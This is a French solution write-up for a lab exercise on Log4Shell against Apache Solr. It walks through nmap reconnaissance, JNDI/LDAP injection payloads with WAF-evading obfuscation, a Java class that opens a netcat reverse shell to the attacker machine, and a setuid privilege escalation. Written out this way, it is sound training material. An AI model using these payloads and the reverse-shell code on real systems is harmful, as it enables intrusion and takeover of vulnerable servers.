# Ce fichier a but pour de donner la solution du TP 'Red_Log4Shell'
# Les adresse IP ne sont pas forcément identiques.
# Cette solution sera en 4 parties :
## Partie   I : Reconnaissance
`nmap -sP 172.17.17.0/24`
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 08:17 EDT
Nmap scan report for 172.17.17.2
Host is up (0.13s latency).
Nmap scan report for kali (172.17.17.139)
Host is up (1.3s latency).
Nmap scan report for 172.17.17.165
Host is up (0.40s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 18.89 seconds
```

`nmap -sS -sV -A -p- 172.17.17.165`
```
Nmap scan report for 172.17.17.165
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f2:7f:fc:28:53:0e:cf:2e:ca:71:fc:e7:1d:73:2f:6f (RSA)
|   256 25:58:a7:ff:9c:b7:5e:23:80:70:d4:f0:7c:1b:c2:39 (ECDSA)
|_  256 a5:8e:7b:b7:f6:d1:4c:fb:68:3f:3f:f7:ff:39:1d:29 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
MAC Address: 00:0C:29:C5:4E:A5 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: Host: RedBlueLab.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE
HOP RTT      ADDRESS
1   14.86 ms 172.17.17.165
 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.69 seconds
```
![Capture d'écran de la version d'Apache Solr](https://github.com/GetSun2EZ/RedBlue-Lab/blob/main/Images/solr_version.png)

## Partie  II : Recherche d'une vulnérabilité sur l'application découverte
Maintenant que nous avons obtenu la technologie utilisée et les versions des applications, il faut explorer les potentielles vulnérabilités présentes sur ces applications. Ici, en cherchant sur internet, nous pouvons découvrir que sur la version 8.11.0. d’Apache Solr, la vulnérabilité Log4Shell est possible. Au chemin "/solr/admin/cores" du site tous les paramètres fournis sur cette page sont interprétés par Log4J.

Pour l’instant, tout ça reste hypothétique, il va falloir tester.
Pour réaliser l’attaque,il sera nécessaire d’ouvrir un serveur un serveur LDAP sur notre machine attaquante. En continuant nos recherches, l’outil "marshalsec" se révèle très utile. Nous aurons besoin d’un serveur Web, que l’on pourra obtenir facilement avec python.

Avant toute chose, il faut installer la même version de java que celle de l’application.
- Télécharger le paquet Java 8u181 <br>
`$ wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz`

- Décompresser le paquet <br>
`$ tar -xzf jdk-8u181-linux-x64.tar.gz`

Ensuite, regardons si le point d’injection est correct, nous allons simplement initialiser une connexion LDAP vers notre machine attaque grâce à l’API JNDI.
Il faut ouvrir un serveur sur la machine attaquante avec la commande suivante : <br>
`$ jdk1.8.0_181/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1/#Payload"`

Il n’est pas encore nécessaire de spécifier un serveur Web car il s’agit d’un test.
Comme la charge utile doit être présente dans un paramètre, la requête qui sera envoyée ressemblera à ceci :<br>
`$ curl 'http://172.17.17.165/solr/admin/cores?toto=$\{jndi:ldap://172.17.17.139:1389\}'`

L’exécution de cette commande, nous renvoie l’erreur suivante : <br>
![Capture d'écran de l'erreur](https://github.com/GetSun2EZ/RedBlue-Lab/blob/main/Images/erreur_waf.png)

Cette erreur peut nous faire penser qu’un WAF bloque notre requête, essayons la même commande mais avec un peu d’obfuscation : <br>
`$ curl 'http://172.17.17.165/solr/admin/cores?toto=${${lower:j}ndi:ldap://172.17.17.139:1389\}'`

Cette fois une connexion a bien été enregistrée sur notre serveur LDAP, ce qui signifie que l’application Web est belle et bien vulnérable à Log4Shell. <br>
![Capture d'écran de la réponse du serveur LDAP](https://github.com/GetSun2EZ/RedBlue-Lab/blob/main/Images/ldap_local.png)

Nous pouvons aussi voir que le serveur LDAP redirige vers un serveur Web.

## Partie III : Exploitation de la vulnérabilité trouvée
Créons maintenant la charge utile, créer un fichier Exploit.java et modifié le comme suivant : <br>
```
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc.traditional -e /bin/bash 172.17.17.139 1721");
        } catch (Exception e) {}
    }
}
```
Attention, il s’agit d’une classe publique, il sera impossible de compiler le fichier si le nom de la classe n’est pas égal au nom du fichier.
Pour compiler le fichier utiliser la commande suivante : <br>
`$ jdk1.8.0_181/bin/javac Exploit.java`

Relancer le serveur LDAP sur la machine attaquante mais redirigera les requêtes vers le serveur Web python qui sera ouvert sur la machine attaquante : <br>
`$ jdk1.8.0_181/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.17.139/#Exploit"`

Lancer le serveur Web python : <br>
`$ python3 -m http.server`

Se mettre en écoute sur le port 1721 : <br>
`$ nc -lnvp 1721`

Lancer la requête cURL : <br>
`$ curl 'http://172.17.17.165/solr/admin/cores?toto=${${lower:j}ndi:ldap://172.17.17.139:1389:Exploit\}'`
![Capture d'écran de la réponse du serveur LDAP](https://github.com/GetSun2EZ/RedBlue-Lab/blob/main/Images/ldap.png)
![Capture d'écran de la réponse du serveur Web](https://github.com/GetSun2EZ/RedBlue-Lab/blob/main/Images/serveur_web.png)
![Capture d'écran de la réponse du NC](https://github.com/GetSun2EZ/RedBlue-Lab/blob/main/Images/nc_connexion.png)

On peut constater que la requête cURL se connecte bien sur notre serveur LDAP qui lui redirige correctement vers notre serveur Web afin d’importer la charge utile qui elle va exécuter la commande "nc.traditional -e /bin/bash 172.17.17.139 1721" et crée un reverse shell.
Afin d’obtenir un terminal interactif, il est possible d’exécuter les commandes suivantes :
```
python3 -c "__import__('pty').spawn('/bin/bash')"
ctrl+z
echo $TERM && tput lines && tput cols
stty raw -echo; fg
reset
xterm
```
Nous avons obtenu le drapeau utilisateur.

## Partie  IV : Escalade de privilège
Pour obtenir le drapeau administrateur, il faudra exploiter une autre vulnérabilité. Afin de la trouver le plus rapidement possible, il peut être judicieux d’utiliser le programme "linpeas.sh". En cherchant un peu dans la sortie de ce programme, nous découvrons qu'un binaire qui se nomme "boring" possède un "setuid". En faisant de la  rétro-ingénierie, on découvre qu’en l'exécutant et en écrivant "RootAccess" dans le terminal, nous obtenons un accès administrateur.



